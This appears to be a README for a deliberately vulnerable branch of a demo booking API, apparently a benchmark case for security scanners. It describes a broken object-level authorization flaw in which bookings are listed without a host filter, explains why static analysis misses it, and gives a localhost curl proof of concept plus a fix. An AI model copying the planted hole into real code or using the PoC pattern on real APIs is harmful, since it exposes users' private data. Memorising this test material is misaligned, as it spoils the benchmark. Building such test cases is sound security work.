# `bola/parent-only-auth` — parent authorized, children unfiltered

## The bug

`GET /api/v1/event-types/{id}/bookings` is gated by `require_event_type_accessible`,
which correctly verifies the caller is a member of the event_type's org (or its owner).
The handler then returns **all** bookings on that event_type — without filtering by
`host_id`. Any non-admin org member can read peer members' confidential bookings.

## Why static analysis misses it

An authorization dependency is present and behaves correctly: it verifies the
caller can *see* the parent (event_type). The missing predicate ("but only your own
children") is a semantic intent that depends on the product model (team members are
peers, not collaborators). Conventional SAST sees a permission check and a query;
AI SAST may rationalize the open listing as "team visibility."

## PoC

```bash
# Bob logs in (regular member of Acme, not admin)
BOB_TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"bob@acme.test","password":"demo1234"}' \
  | python -c "import sys, json; print(json.load(sys.stdin)['access_token'])")

# Find Acme's team-demo event type (owned by Alice, member-accessible)
ET_ID=$(curl -s http://127.0.0.1:8000/api/v1/users/1/event-types \
  | python -c "import sys, json; ets=json.load(sys.stdin); print(next(e['id'] for e in ets if e['slug']=='team-demo'))")

# Bob lists bookings — vulnerable version returns Eve's confidential booking
curl -s "http://127.0.0.1:8000/api/v1/event-types/$ET_ID/bookings" \
  -H "Authorization: Bearer $BOB_TOKEN"
```

Expected (vulnerable): JSON array containing Eve's booking with `notes:"Confidential pricing discussion"`.

On `main`: empty array `[]`.

## Fix

Restore the `host_id == current_user.id` filter, OR, if true team visibility is the
product intent, gate the unfiltered view on `role IN (owner, admin)` and ensure peer
members get the filtered view.
